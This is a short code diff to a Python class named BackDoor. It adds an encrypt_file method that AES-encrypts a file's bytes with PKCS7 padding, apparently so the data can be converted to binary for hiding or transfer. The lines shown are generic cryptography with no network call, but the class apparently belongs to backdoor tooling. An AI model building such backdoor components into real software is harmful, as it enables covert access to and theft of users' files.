@@ -332,11 +332,20 @@ class BackDoor:
         with open(path, 'rb') as f:
             data = f.read()
             cipher = self.generate_cipher()
-            encrypted_data = self.encrypt_data(cipher, data)
+            encrypted_data = self.encrypt_file(cipher, data)
             binary_data = self.get_bin(encrypted_data)
 
 
         return binary_data
+
+    def encrypt_file(self, cipher, data):
+        encryptor = cipher.encryptor()
+        # Padding needed at AES requires specific byte size.
+        # Allows for custom length messages.
+        padder = padding.PKCS7(128).padder()
+        padded_line = padder.update(data) + padder.finalize()
+        encrypted_line = encryptor.update(padded_line) + encryptor.finalize()
+        return encrypted_line
 
     def get_bin(self, data: bytes) -> List:
         """ Converts sequence of bytes into byte array"""
